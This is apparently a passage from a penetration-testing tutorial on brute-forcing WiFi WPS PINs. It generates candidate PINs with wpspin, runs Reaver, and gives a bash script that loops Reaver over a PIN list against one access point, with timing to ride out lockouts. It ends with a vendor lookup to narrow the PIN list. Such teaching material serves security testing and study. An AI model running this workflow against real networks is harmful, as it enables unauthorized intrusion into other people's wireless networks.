
While it is possible to bruteforce the WPS PIN using `Reaver`, we can also use a custom wordlist of potential PINs. In this section, we will explore how to generate possible PINs for a WiFi network using `wpspin` and then create a custom bash script to bruteforce the access point with these PINs.

### Using Python WPSPin to Generate Default PINs

```
git clone https://github.com/epicdev420/WPSPin.git
```

```
cd wpspin
```

```
sudo python setup.py install
```

```
wpspin -A 60:38:E0:A2:3D:2A
```

WPSPin outputs a variety of possible PINs for valid BSSIDs. To retrieve the WPA-PSK from a known PIN, we can use the following command.

```
sudo reaver --max-attempts=1 -l 100 -r 3:45 -i mon0 -b 60:38:E0:A2:3D:2A -c 1 -p 73834410
```

```
wpspin -A 60:38:E0:A2:3D:2A | grep -Eo '\b[0-9]{8}\b' | tr '\n' ' '
```

This command filters and displays the 8-digit pins from the output file, separating them with spaces. We can now store this output in a variable of a bash script and use it for brute-forcing WPS, as shown below.

```
#!/bin/bash

#We add generated PINs into this list
PINS='76142673 24952910 31080279 31080279 10149713 42705239 65814352 35934868 20660413 53157652 84636386 91629487 52285349 28428015 51018658 66505471 04217176 12345670 20172527 46264848 76229909 62327145 10864111 31957199 30432031 71412252 68175542 95661469 95719115 48563710 20854836 43977680 05294176 99956042 35611530 67958146 34259283 94229882 95755212'

for PIN in $PINS
do
    echo Attempting PIN: $PIN
    sudo reaver --max-attempts=1 -l 100 -r 3:45 -i mon0 -b 60:38:E0:A2:3D:2A -c 1 -p $PIN
done
echo "PIN Guesses Complete"
```


With this script, we execute the same Reaver command for every PIN in the provided list. While it could be refined or built onto, the basic functionality is as follows:

- For each generated PIN attempted, the script will try the PIN only once, and then wait for 100 seconds if the access point (AP) locks
- Additionally, for every three attempts made, it will pause for 45 seconds.
- The script iterates through all the PINs in the list, which can be seen in action in the example below:

```
sudo bash pinguess.sh
```

### Performing Vendor Lookup

If the access point is secured and locks after a few attempts, in some cases we can perform a vendor lookup to refine our list of potential PINs. This can be done using the `oui.txt` file included in Linux distributions. The `oui.txt` file contains information about the organizations that own different MAC address prefixes.

To perform a vendor lookup, we can use the following `grep` command, specifying the first portion of the target network’s BSSID:

```
grep -i "60-38-E0" /var/lib/ieee-data/oui.txt
```

